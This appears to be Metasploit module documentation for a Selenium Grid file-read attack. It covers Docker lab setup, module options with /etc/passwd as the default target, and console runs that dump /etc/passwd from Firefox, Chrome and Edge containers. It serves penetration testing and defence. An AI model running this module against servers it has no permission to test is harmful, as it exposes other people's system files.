## Vulnerable Application

If there is an open selenium web driver, a remote attacker can send requests to the victims browser.
In certain cases this can be used to access to the remote file system.

The vulnerability affects:

    * all version of open Selenium Server (Grid)

This module was successfully tested on:

    * selenium/standalone-firefox:3.141.59 installed with Docker on Ubuntu 24.04
    * selenium/standalone-firefox:4.0.0-alpha-6-20200730 installed with Docker on Ubuntu 24.04
    * selenium/standalone-firefox:4.6 installed with Docker on Ubuntu 24.04
    * selenium/standalone-firefox:4.27.0 installed with Docker on Ubuntu 24.04
    * selenium/standalone-chrome:4.27.0 installed with Docker on Ubuntu 24.04
    * selenium/standalone-edge:4.27.0 installed with Docker on Ubuntu 24.04


### Installation

1. `docker pull selenium/standalone-firefox:3.141.59`

2. `docker run -d -p 4444:4444 -p 7900:7900 --shm-size="2g" selenium/standalone-firefox:3.141.59`


## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/gather/selenium_file_read`
4. Do: `run rhost=<rhost>`
5. You should get a file content


## Options

### SCHEME (Required)

This is the scheme to use. Default is `file`.

### FILEPATH (Required)

This is the file to read. Default is `/etc/passwd`.

### BROWSER (Required)

This is the browser to use. Default is `firefox`.

### TIMEOUT (required)

This is the amount of time (in seconds) that the module will wait for the payload to be
executed. Defaults to 75 seconds.


## Scenarios
### selenium/standalone-firefox:3.141.59 installed with Docker on Ubuntu 24.04
```
msf6 > use auxiliary/gather/selenium_file_read
msf6 auxiliary(gather/selenium_file_read) > options

Module options (auxiliary/gather/selenium_file_read):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   BROWSER   firefox          yes       The browser to use (Accepted: firefox, chrome, MicrosoftEdge)
   FILEPATH  /etc/passwd      yes       File to read
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     4444             yes       The target port (TCP)
   SCHEME    file             yes       The scheme to use
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   TIMEOUT   75               yes       Timeout for exploit (seconds)
   VHOST                      no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4445
[*] Running module against 192.168.56.16
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version 3.141.59 detected
[*] Started session (4a48aef3-9379-4cbe-9d6a-1ecc3176dc14).
[+] /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
seluser:x:1200:1201::/home/seluser:/bin/bash
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
rtkit:x:105:106:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:106:107:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin

[*] Failed to delete the session (4a48aef3-9379-4cbe-9d6a-1ecc3176dc14). You may need to wait for the session to expire (default: 5 minutes) or manually delete the session for the next exploit to succeed.
[*] Auxiliary module execution completed
```

### selenium/standalone-firefox:4.0.0-alpha-6-20200730 installed with Docker on Ubuntu 24.04
```
msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4446
[*] Running module against 192.168.56.16
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
[*] Started session (eb790e48-318a-4949-a7ff-8566f181a609).
[+] /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
seluser:x:1200:1201::/home/seluser:/bin/bash
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
rtkit:x:104:105:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:105:106:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin

[*] Failed to delete the session (eb790e48-318a-4949-a7ff-8566f181a609). You may need to wait for the session to expire (default: 5 minutes) or manually delete the session for the next exploit to succeed.
[*] Auxiliary module execution completed
```

### selenium/standalone-firefox:4.6 installed with Docker on Ubuntu 24.04
```
msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4447
[*] Running module against 192.168.56.16
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
[*] Started session (2b4d313e-6e42-4c33-8bc8-630103269ef7).
[+] /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
seluser:x:1200:1201::/home/seluser:/bin/bash
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
rtkit:x:105:106:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:106:107:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin

[*] Failed to delete the session (2b4d313e-6e42-4c33-8bc8-630103269ef7). You may need to wait for the session to expire (default: 5 minutes) or manually delete the session for the next exploit to succeed.
[*] Auxiliary module execution completed
```

### selenium/standalone-firefox:4.27.0 installed with Docker on Ubuntu 24.04
```
msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4448
[*] Running module against 192.168.56.16
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
[*] Started session (599a7d03-1eca-41f3-8726-3a192104dfc1).
[+] /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
seluser:x:1200:1201::/home/seluser:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
pulse:x:101:102:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin

[*] Failed to delete the session (599a7d03-1eca-41f3-8726-3a192104dfc1). You may need to wait for the session to expire (default: 5 minutes) or manually delete the session for the next exploit to succeed.
[*] Auxiliary module execution completed
```

### selenium/standalone-chrome:4.27.0 installed with Docker on Ubuntu 24.04
```
msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4453 BROWSER=chrome
[*] Running module against 192.168.56.16
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
[*] Started session (363b104ba9d167f434518d3eb1add0c6).
[+] /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
seluser:x:1200:1201::/home/seluser:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
pulse:x:101:102:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin

[*] Deleted session (363b104ba9d167f434518d3eb1add0c6).
[*] Auxiliary module execution completed
```

### selenium/standalone-edge:4.27.0 installed with Docker on Ubuntu 24.04
```
msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4454 BROWSER=MicrosoftEdge
[*] Running module against 192.168.56.16
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
[*] Started session (80c4ac70d41d4ffc5585e750c94d9ac5).
[+] /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
seluser:x:1200:1201::/home/seluser:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
pulse:x:101:102:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin

[*] Deleted session (80c4ac70d41d4ffc5585e750c94d9ac5).
[*] Auxiliary module execution completed
```
